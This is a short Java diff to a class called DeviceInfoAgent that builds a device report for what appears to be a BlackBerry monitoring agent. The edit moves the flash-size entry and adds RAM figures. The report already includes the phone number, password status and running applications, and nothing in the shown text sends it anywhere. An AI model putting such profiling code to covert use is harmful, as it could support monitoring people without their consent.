@@ -155,11 +155,11 @@ public final class DeviceInfoAgent extends Agent {
 
 		// Device
 		// sb.append("\nDEVICE\n------\n");
-		// DISK
-		sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
-
+		
 		// OS Version
 		sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
+		sb.append("RAM: " + Runtime.getRuntime().totalMemory() + "\n");
+		sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
 		sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
 		sb.append("Phone: " + device.getPhoneNumber() + "\n");
 
@@ -167,6 +167,9 @@ public final class DeviceInfoAgent extends Agent {
 		sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
 		sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
 		sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
+
+		// DISK
+		sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
 
 		sb.append(getRunningApplications());
 		
